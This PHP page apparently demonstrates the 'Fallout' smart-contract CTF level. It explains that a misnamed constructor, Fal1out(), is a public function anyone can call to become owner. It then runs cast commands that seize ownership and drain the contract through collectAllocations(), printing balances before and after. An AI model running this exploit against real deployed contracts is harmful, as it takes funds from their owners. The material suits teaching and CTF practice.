<?php 
include "prepare.php";
if (!$_POST):
?>
<pre>
A constructor in Solidity ≥0.4.22 MUST:

be named constructor

or have the same name as the contract (before 0.4.22)

But here the “constructor” is written incorrectly:

function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}


Notice the trick:

❌ Wrong name

Fal1out (with a number 1)
vs
Fallout (with two L’s)

This is NOT the constructor—it's a public function.

Meaning:

👉 Anyone can call Fal1out() at any time
👉 and set themselves as owner

This is the entire vulnerability.

🚨 2. Why is this insecure?

Because the contract deployer expected the constructor to run once.

But since Fal1out() is not a constructor, it becomes a public function.

Anyone can call:

contract.Fal1out()


And this line runs:

owner = msg.sender;


Which rewrites the owner forever.
<?php
exit;
endif;


echo "<pre>";
echo "<div style='color:red; font-size:24px; font-weight:bold; 1border:2px solid red; padding:5px; width:340px; display:inline-block;'>
SELECTED CONTRACT\n</div>";
echo "\n$CONTRACT\n";
echo "\n=== BALANCES ===\n";
echo cast("cast balance $CONTRACT --rpc-url $RPC");
echo cast("cast balance $PLAYER --rpc-url $RPC");
echo "\n";

echo "<div style='color:red; font-size:24px; font-weight:bold; 1border:2px solid red; padding:5px; width:280px; display:inline-block;'>
OWNER BEFORE\n
</div>";
$before = cast("cast call $CONTRACT \"owner()\" --rpc-url $RPC");
echo "<span style='color:red; font-size:18px; font-weight:bold;'>$before</span>\n";

echo "\n=== CLAIM OWNERSHIP BY CALLING Fal1out() ===\n";
echo cast("cast send $CONTRACT \"Fal1out()\" --private-key $PK --rpc-url $RPC");

echo "\n";
echo "<div style='color:red; font-size:24px; font-weight:bold; 1border:2px solid red; padding:5px; width:260px; display:inline-block;'>
OWNER AFTER\n
</div>";
$after = cast("cast call $CONTRACT \"owner()\" --rpc-url $RPC");
echo "<span style='color:green; font-size:20px; font-weight:bold;'>$after</span>\n";

echo "\n=== DRAIN CONTRACT (collectAllocations) ===\n";
echo cast("cast send $CONTRACT \"collectAllocations()\" --private-key $PK --rpc-url $RPC");

echo "\n=== FINAL BALANCES ===\n";
echo cast("cast balance $CONTRACT --rpc-url $RPC");
echo cast("cast balance $PLAYER --rpc-url $RPC");

echo "</pre>";
?>